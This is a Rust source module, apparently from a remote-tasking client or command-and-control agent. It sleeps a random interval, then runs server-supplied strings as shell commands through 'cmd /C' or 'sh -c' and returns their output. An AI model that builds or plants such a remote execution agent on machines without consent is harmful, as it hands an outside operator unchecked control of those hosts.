use std::{
    process::Command,
    io::Write,
    str,
    thread,
    time,
};
use rand::Rng;
use crate::models::TaskResult;
use crate::Task;

const TERMINAL_CMD: &'static str = "terminal";

pub fn run_task(task: Task) -> TaskResult {
    let wait = rand::thread_rng().gen_range(task.min_delay, task.max_delay);
    thread::sleep(time::Duration::from_millis(wait as u64));

    // Add more command types here when supported by server and implemented in client
    let result = terminal_command(task.id, task.data);

    result
}


/// Runs a terminal command at the client host
pub fn terminal_command(id: String, command: String) -> TaskResult {
    #[cfg(debug_assertions)]
    println!("Running command: {}", command);

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .output()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Failed to execute command")
    };
    #[cfg(debug_assertions)]
        std::io::stdout().write_all(&output.stdout).unwrap();

    let output_string = match str::from_utf8(&output.stdout) {
        Ok(val) => val,
        Err(_) => "Failed parse output command"
    };
    TaskResult {
        id,
        status: output.status.code().unwrap(),
        result: String::from(output_string),
    }
}
